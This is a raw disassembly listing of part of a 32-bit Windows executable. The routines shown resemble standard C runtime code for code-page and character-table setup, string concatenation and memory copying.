  4059db:	59                   	pop    %ecx
  4059dc:	83 f8 ff             	cmp    $0xffffffff,%eax
  4059df:	59                   	pop    %ecx
  4059e0:	74 12                	je     0x4059f4
  4059e2:	6a 00                	push   $0x0
  4059e4:	6a 00                	push   $0x0
  4059e6:	53                   	push   %ebx
  4059e7:	e8 f9 d3 ff ff       	call   0x402de5
  4059ec:	83 c4 0c             	add    $0xc,%esp
  4059ef:	83 f8 ff             	cmp    $0xffffffff,%eax
  4059f2:	75 0c                	jne    0x405a00
  4059f4:	53                   	push   %ebx
  4059f5:	e8 bb d8 ff ff       	call   0x4032b5
  4059fa:	59                   	pop    %ecx
  4059fb:	83 c8 ff             	or     $0xffffffff,%eax
  4059fe:	eb 19                	jmp    0x405a19
  405a00:	80 7d 0b 00          	cmpb   $0x0,0xb(%ebp)
  405a04:	75 11                	jne    0x405a17
  405a06:	f6 45 0c 08          	testb  $0x8,0xc(%ebp)
  405a0a:	74 0b                	je     0x405a17
  405a0c:	8b 07                	mov    (%edi),%eax
  405a0e:	80 4c 30 04 20       	orb    $0x20,0x4(%eax,%esi,1)
  405a13:	8d 44 30 04          	lea    0x4(%eax,%esi,1),%eax
  405a17:	8b c3                	mov    %ebx,%eax
  405a19:	5f                   	pop    %edi
  405a1a:	5e                   	pop    %esi
  405a1b:	5b                   	pop    %ebx
  405a1c:	c9                   	leave
  405a1d:	c3                   	ret
  405a1e:	6a 04                	push   $0x4
  405a20:	6a 00                	push   $0x0
  405a22:	ff 74 24 0c          	push   0xc(%esp)
  405a26:	e8 04 00 00 00       	call   0x405a2f
  405a2b:	83 c4 0c             	add    $0xc,%esp
  405a2e:	c3                   	ret
  405a2f:	0f b6 44 24 04       	movzbl 0x4(%esp),%eax
  405a34:	8a 4c 24 0c          	mov    0xc(%esp),%cl
  405a38:	84 88 a1 c0 40 00    	test   %cl,0x40c0a1(%eax)
  405a3e:	75 1c                	jne    0x405a5c
  405a40:	83 7c 24 08 00       	cmpl   $0x0,0x8(%esp)
  405a45:	74 0e                	je     0x405a55
  405a47:	0f b7 04 45 62 96 40 	movzwl 0x409662(,%eax,2),%eax
  405a4e:	00 
  405a4f:	23 44 24 08          	and    0x8(%esp),%eax
  405a53:	eb 02                	jmp    0x405a57
  405a55:	33 c0                	xor    %eax,%eax
  405a57:	85 c0                	test   %eax,%eax
  405a59:	75 01                	jne    0x405a5c
  405a5b:	c3                   	ret
  405a5c:	6a 01                	push   $0x1
  405a5e:	58                   	pop    %eax
  405a5f:	c3                   	ret
  405a60:	55                   	push   %ebp
  405a61:	8b ec                	mov    %esp,%ebp
  405a63:	83 ec 18             	sub    $0x18,%esp
  405a66:	53                   	push   %ebx
  405a67:	56                   	push   %esi
  405a68:	57                   	push   %edi
  405a69:	ff 75 08             	push   0x8(%ebp)
  405a6c:	e8 88 01 00 00       	call   0x405bf9
  405a71:	8b f0                	mov    %eax,%esi
  405a73:	59                   	pop    %ecx
  405a74:	3b 35 8c bf 40 00    	cmp    0x40bf8c,%esi
  405a7a:	89 75 08             	mov    %esi,0x8(%ebp)
  405a7d:	0f 84 6a 01 00 00    	je     0x405bed
  405a83:	33 db                	xor    %ebx,%ebx
  405a85:	3b f3                	cmp    %ebx,%esi
  405a87:	0f 84 56 01 00 00    	je     0x405be3
  405a8d:	33 d2                	xor    %edx,%edx
  405a8f:	b8 08 ba 40 00       	mov    $0x40ba08,%eax
  405a94:	39 30                	cmp    %esi,(%eax)
  405a96:	74 72                	je     0x405b0a
  405a98:	83 c0 30             	add    $0x30,%eax
  405a9b:	42                   	inc    %edx
  405a9c:	3d f8 ba 40 00       	cmp    $0x40baf8,%eax
  405aa1:	72 f1                	jb     0x405a94
  405aa3:	8d 45 e8             	lea    -0x18(%ebp),%eax
  405aa6:	50                   	push   %eax
  405aa7:	56                   	push   %esi
  405aa8:	ff 15 c8 80 40 00    	call   *0x4080c8
  405aae:	83 f8 01             	cmp    $0x1,%eax
  405ab1:	0f 85 24 01 00 00    	jne    0x405bdb
  405ab7:	6a 40                	push   $0x40
  405ab9:	33 c0                	xor    %eax,%eax
  405abb:	59                   	pop    %ecx
  405abc:	bf a0 c0 40 00       	mov    $0x40c0a0,%edi
  405ac1:	83 7d e8 01          	cmpl   $0x1,-0x18(%ebp)
  405ac5:	89 35 8c bf 40 00    	mov    %esi,0x40bf8c
  405acb:	f3 ab                	rep stos %eax,%es:(%edi)
  405acd:	aa                   	stos   %al,%es:(%edi)
  405ace:	89 1d a4 c1 40 00    	mov    %ebx,0x40c1a4
  405ad4:	0f 86 ef 00 00 00    	jbe    0x405bc9
  405ada:	80 7d ee 00          	cmpb   $0x0,-0x12(%ebp)
  405ade:	0f 84 bb 00 00 00    	je     0x405b9f
  405ae4:	8d 4d ef             	lea    -0x11(%ebp),%ecx
  405ae7:	8a 11                	mov    (%ecx),%dl
  405ae9:	84 d2                	test   %dl,%dl
  405aeb:	0f 84 ae 00 00 00    	je     0x405b9f
  405af1:	0f b6 41 ff          	movzbl -0x1(%ecx),%eax
  405af5:	0f b6 d2             	movzbl %dl,%edx
  405af8:	3b c2                	cmp    %edx,%eax
  405afa:	0f 87 93 00 00 00    	ja     0x405b93
  405b00:	80 88 a1 c0 40 00 04 	orb    $0x4,0x40c0a1(%eax)
  405b07:	40                   	inc    %eax
  405b08:	eb ee                	jmp    0x405af8
  405b0a:	6a 40                	push   $0x40
  405b0c:	33 c0                	xor    %eax,%eax
  405b0e:	59                   	pop    %ecx
  405b0f:	bf a0 c0 40 00       	mov    $0x40c0a0,%edi
  405b14:	f3 ab                	rep stos %eax,%es:(%edi)
  405b16:	8d 34 52             	lea    (%edx,%edx,2),%esi
  405b19:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  405b1c:	c1 e6 04             	shl    $0x4,%esi
  405b1f:	aa                   	stos   %al,%es:(%edi)
  405b20:	8d 9e 18 ba 40 00    	lea    0x40ba18(%esi),%ebx
  405b26:	80 3b 00             	cmpb   $0x0,(%ebx)
  405b29:	8b cb                	mov    %ebx,%ecx
  405b2b:	74 2c                	je     0x405b59
  405b2d:	8a 51 01             	mov    0x1(%ecx),%dl
  405b30:	84 d2                	test   %dl,%dl
  405b32:	74 25                	je     0x405b59
  405b34:	0f b6 01             	movzbl (%ecx),%eax
  405b37:	0f b6 fa             	movzbl %dl,%edi
  405b3a:	3b c7                	cmp    %edi,%eax
  405b3c:	77 14                	ja     0x405b52
  405b3e:	8b 55 fc             	mov    -0x4(%ebp),%edx
  405b41:	8a 92 00 ba 40 00    	mov    0x40ba00(%edx),%dl
  405b47:	08 90 a1 c0 40 00    	or     %dl,0x40c0a1(%eax)
  405b4d:	40                   	inc    %eax
  405b4e:	3b c7                	cmp    %edi,%eax
  405b50:	76 f5                	jbe    0x405b47
  405b52:	41                   	inc    %ecx
  405b53:	41                   	inc    %ecx
  405b54:	80 39 00             	cmpb   $0x0,(%ecx)
  405b57:	75 d4                	jne    0x405b2d
  405b59:	ff 45 fc             	incl   -0x4(%ebp)
  405b5c:	83 c3 08             	add    $0x8,%ebx
  405b5f:	83 7d fc 04          	cmpl   $0x4,-0x4(%ebp)
  405b63:	72 c1                	jb     0x405b26
  405b65:	8b 45 08             	mov    0x8(%ebp),%eax
  405b68:	c7 05 9c bf 40 00 01 	movl   $0x1,0x40bf9c
  405b6f:	00 00 00 
  405b72:	50                   	push   %eax
  405b73:	a3 8c bf 40 00       	mov    %eax,0x40bf8c
  405b78:	e8 c6 00 00 00       	call   0x405c43
  405b7d:	8d b6 0c ba 40 00    	lea    0x40ba0c(%esi),%esi
  405b83:	bf 90 bf 40 00       	mov    $0x40bf90,%edi
  405b88:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  405b89:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  405b8a:	59                   	pop    %ecx
  405b8b:	a3 a4 c1 40 00       	mov    %eax,0x40c1a4
  405b90:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  405b91:	eb 55                	jmp    0x405be8
  405b93:	41                   	inc    %ecx
  405b94:	41                   	inc    %ecx
  405b95:	80 79 ff 00          	cmpb   $0x0,-0x1(%ecx)
  405b99:	0f 85 48 ff ff ff    	jne    0x405ae7
  405b9f:	6a 01                	push   $0x1
  405ba1:	58                   	pop    %eax
  405ba2:	80 88 a1 c0 40 00 08 	orb    $0x8,0x40c0a1(%eax)
  405ba9:	40                   	inc    %eax
  405baa:	3d ff 00 00 00       	cmp    $0xff,%eax
  405baf:	72 f1                	jb     0x405ba2
  405bb1:	56                   	push   %esi
  405bb2:	e8 8c 00 00 00       	call   0x405c43
  405bb7:	59                   	pop    %ecx
  405bb8:	a3 a4 c1 40 00       	mov    %eax,0x40c1a4
  405bbd:	c7 05 9c bf 40 00 01 	movl   $0x1,0x40bf9c
  405bc4:	00 00 00 
  405bc7:	eb 06                	jmp    0x405bcf
  405bc9:	89 1d 9c bf 40 00    	mov    %ebx,0x40bf9c
  405bcf:	33 c0                	xor    %eax,%eax
  405bd1:	bf 90 bf 40 00       	mov    $0x40bf90,%edi
  405bd6:	ab                   	stos   %eax,%es:(%edi)
  405bd7:	ab                   	stos   %eax,%es:(%edi)
  405bd8:	ab                   	stos   %eax,%es:(%edi)
  405bd9:	eb 0d                	jmp    0x405be8
  405bdb:	39 1d 48 bf 40 00    	cmp    %ebx,0x40bf48
  405be1:	74 0e                	je     0x405bf1
  405be3:	e8 8e 00 00 00       	call   0x405c76
  405be8:	e8 b2 00 00 00       	call   0x405c9f
  405bed:	33 c0                	xor    %eax,%eax
  405bef:	eb 03                	jmp    0x405bf4
  405bf1:	83 c8 ff             	or     $0xffffffff,%eax
  405bf4:	5f                   	pop    %edi
  405bf5:	5e                   	pop    %esi
  405bf6:	5b                   	pop    %ebx
  405bf7:	c9                   	leave
  405bf8:	c3                   	ret
  405bf9:	8b 44 24 04          	mov    0x4(%esp),%eax
  405bfd:	83 25 48 bf 40 00 00 	andl   $0x0,0x40bf48
  405c04:	83 f8 fe             	cmp    $0xfffffffe,%eax
  405c07:	75 10                	jne    0x405c19
  405c09:	c7 05 48 bf 40 00 01 	movl   $0x1,0x40bf48
  405c10:	00 00 00 
  405c13:	ff 25 40 80 40 00    	jmp    *0x408040
  405c19:	83 f8 fd             	cmp    $0xfffffffd,%eax
  405c1c:	75 10                	jne    0x405c2e
  405c1e:	c7 05 48 bf 40 00 01 	movl   $0x1,0x40bf48
  405c25:	00 00 00 
  405c28:	ff 25 44 80 40 00    	jmp    *0x408044
  405c2e:	83 f8 fc             	cmp    $0xfffffffc,%eax
  405c31:	75 0f                	jne    0x405c42
  405c33:	a1 78 bf 40 00       	mov    0x40bf78,%eax
  405c38:	c7 05 48 bf 40 00 01 	movl   $0x1,0x40bf48
  405c3f:	00 00 00 
  405c42:	c3                   	ret
  405c43:	8b 44 24 04          	mov    0x4(%esp),%eax
  405c47:	2d a4 03 00 00       	sub    $0x3a4,%eax
  405c4c:	74 22                	je     0x405c70
  405c4e:	83 e8 04             	sub    $0x4,%eax
  405c51:	74 17                	je     0x405c6a
  405c53:	83 e8 0d             	sub    $0xd,%eax
  405c56:	74 0c                	je     0x405c64
  405c58:	48                   	dec    %eax
  405c59:	74 03                	je     0x405c5e
  405c5b:	33 c0                	xor    %eax,%eax
  405c5d:	c3                   	ret
  405c5e:	b8 04 04 00 00       	mov    $0x404,%eax
  405c63:	c3                   	ret
  405c64:	b8 12 04 00 00       	mov    $0x412,%eax
  405c69:	c3                   	ret
  405c6a:	b8 04 08 00 00       	mov    $0x804,%eax
  405c6f:	c3                   	ret
  405c70:	b8 11 04 00 00       	mov    $0x411,%eax
  405c75:	c3                   	ret
  405c76:	57                   	push   %edi
  405c77:	6a 40                	push   $0x40
  405c79:	59                   	pop    %ecx
  405c7a:	33 c0                	xor    %eax,%eax
  405c7c:	bf a0 c0 40 00       	mov    $0x40c0a0,%edi
  405c81:	f3 ab                	rep stos %eax,%es:(%edi)
  405c83:	aa                   	stos   %al,%es:(%edi)
  405c84:	33 c0                	xor    %eax,%eax
  405c86:	bf 90 bf 40 00       	mov    $0x40bf90,%edi
  405c8b:	a3 8c bf 40 00       	mov    %eax,0x40bf8c
  405c90:	a3 9c bf 40 00       	mov    %eax,0x40bf9c
  405c95:	a3 a4 c1 40 00       	mov    %eax,0x40c1a4
  405c9a:	ab                   	stos   %eax,%es:(%edi)
  405c9b:	ab                   	stos   %eax,%es:(%edi)
  405c9c:	ab                   	stos   %eax,%es:(%edi)
  405c9d:	5f                   	pop    %edi
  405c9e:	c3                   	ret
  405c9f:	55                   	push   %ebp
  405ca0:	8b ec                	mov    %esp,%ebp
  405ca2:	81 ec 14 05 00 00    	sub    $0x514,%esp
  405ca8:	8d 45 ec             	lea    -0x14(%ebp),%eax
  405cab:	56                   	push   %esi
  405cac:	50                   	push   %eax
  405cad:	ff 35 8c bf 40 00    	push   0x40bf8c
  405cb3:	ff 15 c8 80 40 00    	call   *0x4080c8
  405cb9:	83 f8 01             	cmp    $0x1,%eax
  405cbc:	0f 85 16 01 00 00    	jne    0x405dd8
  405cc2:	33 c0                	xor    %eax,%eax
  405cc4:	be 00 01 00 00       	mov    $0x100,%esi
  405cc9:	88 84 05 ec fe ff ff 	mov    %al,-0x114(%ebp,%eax,1)
  405cd0:	40                   	inc    %eax
  405cd1:	3b c6                	cmp    %esi,%eax
  405cd3:	72 f4                	jb     0x405cc9
  405cd5:	8a 45 f2             	mov    -0xe(%ebp),%al
  405cd8:	c6 85 ec fe ff ff 20 	movb   $0x20,-0x114(%ebp)
  405cdf:	84 c0                	test   %al,%al
  405ce1:	74 37                	je     0x405d1a
  405ce3:	53                   	push   %ebx
  405ce4:	57                   	push   %edi
  405ce5:	8d 55 f3             	lea    -0xd(%ebp),%edx
  405ce8:	0f b6 0a             	movzbl (%edx),%ecx
  405ceb:	0f b6 c0             	movzbl %al,%eax
  405cee:	3b c1                	cmp    %ecx,%eax
  405cf0:	77 1d                	ja     0x405d0f
  405cf2:	2b c8                	sub    %eax,%ecx
  405cf4:	8d bc 05 ec fe ff ff 	lea    -0x114(%ebp,%eax,1),%edi
  405cfb:	41                   	inc    %ecx
  405cfc:	b8 20 20 20 20       	mov    $0x20202020,%eax
  405d01:	8b d9                	mov    %ecx,%ebx
  405d03:	c1 e9 02             	shr    $0x2,%ecx
  405d06:	f3 ab                	rep stos %eax,%es:(%edi)
  405d08:	8b cb                	mov    %ebx,%ecx
  405d0a:	83 e1 03             	and    $0x3,%ecx
  405d0d:	f3 aa                	rep stos %al,%es:(%edi)
  405d0f:	42                   	inc    %edx
  405d10:	42                   	inc    %edx
  405d11:	8a 42 ff             	mov    -0x1(%edx),%al
  405d14:	84 c0                	test   %al,%al
  405d16:	75 d0                	jne    0x405ce8
  405d18:	5f                   	pop    %edi
  405d19:	5b                   	pop    %ebx
  405d1a:	6a 00                	push   $0x0
  405d1c:	8d 85 ec fa ff ff    	lea    -0x514(%ebp),%eax
  405d22:	ff 35 a4 c1 40 00    	push   0x40c1a4
  405d28:	ff 35 8c bf 40 00    	push   0x40bf8c
  405d2e:	50                   	push   %eax
  405d2f:	8d 85 ec fe ff ff    	lea    -0x114(%ebp),%eax
  405d35:	56                   	push   %esi
  405d36:	50                   	push   %eax
  405d37:	6a 01                	push   $0x1
  405d39:	e8 b2 13 00 00       	call   0x4070f0
  405d3e:	6a 00                	push   $0x0
  405d40:	8d 85 ec fd ff ff    	lea    -0x214(%ebp),%eax
  405d46:	ff 35 8c bf 40 00    	push   0x40bf8c
  405d4c:	56                   	push   %esi
  405d4d:	50                   	push   %eax
  405d4e:	8d 85 ec fe ff ff    	lea    -0x114(%ebp),%eax
  405d54:	56                   	push   %esi
  405d55:	50                   	push   %eax
  405d56:	56                   	push   %esi
  405d57:	ff 35 a4 c1 40 00    	push   0x40c1a4
  405d5d:	e8 3f 11 00 00       	call   0x406ea1
  405d62:	6a 00                	push   $0x0
  405d64:	8d 85 ec fc ff ff    	lea    -0x314(%ebp),%eax
  405d6a:	ff 35 8c bf 40 00    	push   0x40bf8c
  405d70:	56                   	push   %esi
  405d71:	50                   	push   %eax
  405d72:	8d 85 ec fe ff ff    	lea    -0x114(%ebp),%eax
  405d78:	56                   	push   %esi
  405d79:	50                   	push   %eax
  405d7a:	68 00 02 00 00       	push   $0x200
  405d7f:	ff 35 a4 c1 40 00    	push   0x40c1a4
  405d85:	e8 17 11 00 00       	call   0x406ea1
  405d8a:	83 c4 5c             	add    $0x5c,%esp
  405d8d:	33 c0                	xor    %eax,%eax
  405d8f:	8d 8d ec fa ff ff    	lea    -0x514(%ebp),%ecx
  405d95:	66 8b 11             	mov    (%ecx),%dx
  405d98:	f6 c2 01             	test   $0x1,%dl
  405d9b:	74 16                	je     0x405db3
  405d9d:	80 88 a1 c0 40 00 10 	orb    $0x10,0x40c0a1(%eax)
  405da4:	8a 94 05 ec fd ff ff 	mov    -0x214(%ebp,%eax,1),%dl
  405dab:	88 90 a0 bf 40 00    	mov    %dl,0x40bfa0(%eax)
  405db1:	eb 1c                	jmp    0x405dcf
  405db3:	f6 c2 02             	test   $0x2,%dl
  405db6:	74 10                	je     0x405dc8
  405db8:	80 88 a1 c0 40 00 20 	orb    $0x20,0x40c0a1(%eax)
  405dbf:	8a 94 05 ec fc ff ff 	mov    -0x314(%ebp,%eax,1),%dl
  405dc6:	eb e3                	jmp    0x405dab
  405dc8:	80 a0 a0 bf 40 00 00 	andb   $0x0,0x40bfa0(%eax)
  405dcf:	40                   	inc    %eax
  405dd0:	41                   	inc    %ecx
  405dd1:	41                   	inc    %ecx
  405dd2:	3b c6                	cmp    %esi,%eax
  405dd4:	72 bf                	jb     0x405d95
  405dd6:	eb 49                	jmp    0x405e21
  405dd8:	33 c0                	xor    %eax,%eax
  405dda:	be 00 01 00 00       	mov    $0x100,%esi
  405ddf:	83 f8 41             	cmp    $0x41,%eax
  405de2:	72 19                	jb     0x405dfd
  405de4:	83 f8 5a             	cmp    $0x5a,%eax
  405de7:	77 14                	ja     0x405dfd
  405de9:	80 88 a1 c0 40 00 10 	orb    $0x10,0x40c0a1(%eax)
  405df0:	8a c8                	mov    %al,%cl
  405df2:	80 c1 20             	add    $0x20,%cl
  405df5:	88 88 a0 bf 40 00    	mov    %cl,0x40bfa0(%eax)
  405dfb:	eb 1f                	jmp    0x405e1c
  405dfd:	83 f8 61             	cmp    $0x61,%eax
  405e00:	72 13                	jb     0x405e15
  405e02:	83 f8 7a             	cmp    $0x7a,%eax
  405e05:	77 0e                	ja     0x405e15
  405e07:	80 88 a1 c0 40 00 20 	orb    $0x20,0x40c0a1(%eax)
  405e0e:	8a c8                	mov    %al,%cl
  405e10:	80 e9 20             	sub    $0x20,%cl
  405e13:	eb e0                	jmp    0x405df5
  405e15:	80 a0 a0 bf 40 00 00 	andb   $0x0,0x40bfa0(%eax)
  405e1c:	40                   	inc    %eax
  405e1d:	3b c6                	cmp    %esi,%eax
  405e1f:	72 be                	jb     0x405ddf
  405e21:	5e                   	pop    %esi
  405e22:	c9                   	leave
  405e23:	c3                   	ret
  405e24:	83 3d e8 c2 40 00 00 	cmpl   $0x0,0x40c2e8
  405e2b:	75 12                	jne    0x405e3f
  405e2d:	6a fd                	push   $0xfffffffd
  405e2f:	e8 2c fc ff ff       	call   0x405a60
  405e34:	59                   	pop    %ecx
  405e35:	c7 05 e8 c2 40 00 01 	movl   $0x1,0x40c2e8
  405e3c:	00 00 00 
  405e3f:	c3                   	ret
  405e40:	57                   	push   %edi
  405e41:	8b 7c 24 08          	mov    0x8(%esp),%edi
  405e45:	eb 6a                	jmp    0x405eb1
  405e47:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  405e4e:	8b ff                	mov    %edi,%edi
  405e50:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  405e54:	57                   	push   %edi
  405e55:	f7 c1 03 00 00 00    	test   $0x3,%ecx
  405e5b:	74 0f                	je     0x405e6c
  405e5d:	8a 01                	mov    (%ecx),%al
  405e5f:	41                   	inc    %ecx
  405e60:	84 c0                	test   %al,%al
  405e62:	74 3b                	je     0x405e9f
  405e64:	f7 c1 03 00 00 00    	test   $0x3,%ecx
  405e6a:	75 f1                	jne    0x405e5d
  405e6c:	8b 01                	mov    (%ecx),%eax
  405e6e:	ba ff fe fe 7e       	mov    $0x7efefeff,%edx
  405e73:	03 d0                	add    %eax,%edx
  405e75:	83 f0 ff             	xor    $0xffffffff,%eax
  405e78:	33 c2                	xor    %edx,%eax
  405e7a:	83 c1 04             	add    $0x4,%ecx
  405e7d:	a9 00 01 01 81       	test   $0x81010100,%eax
  405e82:	74 e8                	je     0x405e6c
  405e84:	8b 41 fc             	mov    -0x4(%ecx),%eax
  405e87:	84 c0                	test   %al,%al
  405e89:	74 23                	je     0x405eae
  405e8b:	84 e4                	test   %ah,%ah
  405e8d:	74 1a                	je     0x405ea9
  405e8f:	a9 00 00 ff 00       	test   $0xff0000,%eax
  405e94:	74 0e                	je     0x405ea4
  405e96:	a9 00 00 00 ff       	test   $0xff000000,%eax
  405e9b:	74 02                	je     0x405e9f
  405e9d:	eb cd                	jmp    0x405e6c
  405e9f:	8d 79 ff             	lea    -0x1(%ecx),%edi
  405ea2:	eb 0d                	jmp    0x405eb1
  405ea4:	8d 79 fe             	lea    -0x2(%ecx),%edi
  405ea7:	eb 08                	jmp    0x405eb1
  405ea9:	8d 79 fd             	lea    -0x3(%ecx),%edi
  405eac:	eb 03                	jmp    0x405eb1
  405eae:	8d 79 fc             	lea    -0x4(%ecx),%edi
  405eb1:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  405eb5:	f7 c1 03 00 00 00    	test   $0x3,%ecx
  405ebb:	74 19                	je     0x405ed6
  405ebd:	8a 11                	mov    (%ecx),%dl
  405ebf:	41                   	inc    %ecx
  405ec0:	84 d2                	test   %dl,%dl
  405ec2:	74 64                	je     0x405f28
  405ec4:	88 17                	mov    %dl,(%edi)
  405ec6:	47                   	inc    %edi
  405ec7:	f7 c1 03 00 00 00    	test   $0x3,%ecx
  405ecd:	75 ee                	jne    0x405ebd
  405ecf:	eb 05                	jmp    0x405ed6
  405ed1:	89 17                	mov    %edx,(%edi)
  405ed3:	83 c7 04             	add    $0x4,%edi
  405ed6:	ba ff fe fe 7e       	mov    $0x7efefeff,%edx
  405edb:	8b 01                	mov    (%ecx),%eax
  405edd:	03 d0                	add    %eax,%edx
  405edf:	83 f0 ff             	xor    $0xffffffff,%eax
  405ee2:	33 c2                	xor    %edx,%eax
  405ee4:	8b 11                	mov    (%ecx),%edx
  405ee6:	83 c1 04             	add    $0x4,%ecx
  405ee9:	a9 00 01 01 81       	test   $0x81010100,%eax
  405eee:	74 e1                	je     0x405ed1
  405ef0:	84 d2                	test   %dl,%dl
  405ef2:	74 34                	je     0x405f28
  405ef4:	84 f6                	test   %dh,%dh
  405ef6:	74 27                	je     0x405f1f
  405ef8:	f7 c2 00 00 ff 00    	test   $0xff0000,%edx
  405efe:	74 12                	je     0x405f12
  405f00:	f7 c2 00 00 00 ff    	test   $0xff000000,%edx
  405f06:	74 02                	je     0x405f0a
  405f08:	eb c7                	jmp    0x405ed1
  405f0a:	89 17                	mov    %edx,(%edi)
  405f0c:	8b 44 24 08          	mov    0x8(%esp),%eax
  405f10:	5f                   	pop    %edi
  405f11:	c3                   	ret
  405f12:	66 89 17             	mov    %dx,(%edi)
  405f15:	8b 44 24 08          	mov    0x8(%esp),%eax
  405f19:	c6 47 02 00          	movb   $0x0,0x2(%edi)
  405f1d:	5f                   	pop    %edi
  405f1e:	c3                   	ret
  405f1f:	66 89 17             	mov    %dx,(%edi)
  405f22:	8b 44 24 08          	mov    0x8(%esp),%eax
  405f26:	5f                   	pop    %edi
  405f27:	c3                   	ret
  405f28:	88 17                	mov    %dl,(%edi)
  405f2a:	8b 44 24 08          	mov    0x8(%esp),%eax
  405f2e:	5f                   	pop    %edi
  405f2f:	c3                   	ret
  405f30:	55                   	push   %ebp
  405f31:	8b ec                	mov    %esp,%ebp
  405f33:	57                   	push   %edi
  405f34:	56                   	push   %esi
  405f35:	8b 75 0c             	mov    0xc(%ebp),%esi
  405f38:	8b 4d 10             	mov    0x10(%ebp),%ecx
  405f3b:	8b 7d 08             	mov    0x8(%ebp),%edi
  405f3e:	8b c1                	mov    %ecx,%eax
  405f40:	8b d1                	mov    %ecx,%edx
  405f42:	03 c6                	add    %esi,%eax
  405f44:	3b fe                	cmp    %esi,%edi
  405f46:	76 08                	jbe    0x405f50
  405f48:	3b f8                	cmp    %eax,%edi
  405f4a:	0f 82 78 01 00 00    	jb     0x4060c8
  405f50:	f7 c7 03 00 00 00    	test   $0x3,%edi
  405f56:	75 14                	jne    0x405f6c
  405f58:	c1 e9 02             	shr    $0x2,%ecx
  405f5b:	83 e2 03             	and    $0x3,%edx
  405f5e:	83 f9 08             	cmp    $0x8,%ecx
  405f61:	72 29                	jb     0x405f8c
  405f63:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  405f65:	ff 24 95 78 60 40 00 	jmp    *0x406078(,%edx,4)
  405f6c:	8b c7                	mov    %edi,%eax
  405f6e:	ba 03 00 00 00       	mov    $0x3,%edx
  405f73:	83 e9 04             	sub    $0x4,%ecx
  405f76:	72 0c                	jb     0x405f84
  405f78:	83 e0 03             	and    $0x3,%eax
  405f7b:	03 c8                	add    %eax,%ecx
  405f7d:	ff 24 85 90 5f 40 00 	jmp    *0x405f90(,%eax,4)
  405f84:	ff 24 8d 88 60 40 00 	jmp    *0x406088(,%ecx,4)
  405f8b:	90                   	nop
  405f8c:	ff 24 8d 0c 60 40 00 	jmp    *0x40600c(,%ecx,4)
  405f93:	90                   	nop
  405f94:	a0 5f 40 00 cc       	mov    0xcc00405f,%al
  405f99:	5f                   	pop    %edi
  405f9a:	40                   	inc    %eax
  405f9b:	00 f0                	add    %dh,%al
  405f9d:	5f                   	pop    %edi
  405f9e:	40                   	inc    %eax
  405f9f:	00 23                	add    %ah,(%ebx)
  405fa1:	d1 8a 06 88 07 8a    	rorl   $1,-0x75f877fa(%edx)
  405fa7:	46                   	inc    %esi
  405fa8:	01 88 47 01 8a 46    	add    %ecx,0x468a0147(%eax)
  405fae:	02 c1                	add    %cl,%al
  405fb0:	e9 02 88 47 02       	jmp    0x287e7b7
  405fb5:	83 c6 03             	add    $0x3,%esi
  405fb8:	83 c7 03             	add    $0x3,%edi
  405fbb:	83 f9 08             	cmp    $0x8,%ecx
  405fbe:	72 cc                	jb     0x405f8c
  405fc0:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  405fc2:	ff 24 95 78 60 40 00 	jmp    *0x406078(,%edx,4)
  405fc9:	8d 49 00             	lea    0x0(%ecx),%ecx
  405fcc:	23 d1                	and    %ecx,%edx
  405fce:	8a 06                	mov    (%esi),%al
  405fd0:	88 07                	mov    %al,(%edi)
  405fd2:	8a 46 01             	mov    0x1(%esi),%al
  405fd5:	c1 e9 02             	shr    $0x2,%ecx
  405fd8:	88 47 01             	mov    %al,0x1(%edi)
  405fdb:	83 c6 02             	add    $0x2,%esi
  405fde:	83 c7 02             	add    $0x2,%edi
  405fe1:	83 f9 08             	cmp    $0x8,%ecx
  405fe4:	72 a6                	jb     0x405f8c
  405fe6:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  405fe8:	ff 24 95 78 60 40 00 	jmp    *0x406078(,%edx,4)
  405fef:	90                   	nop
  405ff0:	23 d1                	and    %ecx,%edx
  405ff2:	8a 06                	mov    (%esi),%al
  405ff4:	88 07                	mov    %al,(%edi)
  405ff6:	46                   	inc    %esi
  405ff7:	c1 e9 02             	shr    $0x2,%ecx
  405ffa:	47                   	inc    %edi
  405ffb:	83 f9 08             	cmp    $0x8,%ecx
  405ffe:	72 8c                	jb     0x405f8c
  406000:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  406002:	ff 24 95 78 60 40 00 	jmp    *0x406078(,%edx,4)
  406009:	8d 49 00             	lea    0x0(%ecx),%ecx
  40600c:	6f                   	outsl  %ds:(%esi),(%dx)
  40600d:	60                   	pusha
  40600e:	40                   	inc    %eax
  40600f:	00 5c 60 40          	add    %bl,0x40(%eax,%eiz,2)
  406013:	00 54 60 40          	add    %dl,0x40(%eax,%eiz,2)
  406017:	00 4c 60 40          	add    %cl,0x40(%eax,%eiz,2)
  40601b:	00 44 60 40          	add    %al,0x40(%eax,%eiz,2)
  40601f:	00 3c 60             	add    %bh,(%eax,%eiz,2)
  406022:	40                   	inc    %eax
  406023:	00 34 60             	add    %dh,(%eax,%eiz,2)
  406026:	40                   	inc    %eax
  406027:	00 2c 60             	add    %ch,(%eax,%eiz,2)
  40602a:	40                   	inc    %eax
  40602b:	00 8b 44 8e e4 89    	add    %cl,-0x761b71bc(%ebx)
  406031:	44                   	inc    %esp
  406032:	8f                   	(bad)
  406033:	e4 8b                	in     $0x8b,%al
  406035:	44                   	inc    %esp
  406036:	8e e8                	mov    %eax,%gs
  406038:	89 44 8f e8          	mov    %eax,-0x18(%edi,%ecx,4)
  40603c:	8b 44 8e ec          	mov    -0x14(%esi,%ecx,4),%eax
  406040:	89 44 8f ec          	mov    %eax,-0x14(%edi,%ecx,4)
  406044:	8b 44 8e f0          	mov    -0x10(%esi,%ecx,4),%eax
  406048:	89 44 8f f0          	mov    %eax,-0x10(%edi,%ecx,4)
  40604c:	8b 44 8e f4          	mov    -0xc(%esi,%ecx,4),%eax
  406050:	89 44 8f f4          	mov    %eax,-0xc(%edi,%ecx,4)
  406054:	8b 44 8e f8          	mov    -0x8(%esi,%ecx,4),%eax
  406058:	89 44 8f f8          	mov    %eax,-0x8(%edi,%ecx,4)
  40605c:	8b 44 8e fc          	mov    -0x4(%esi,%ecx,4),%eax
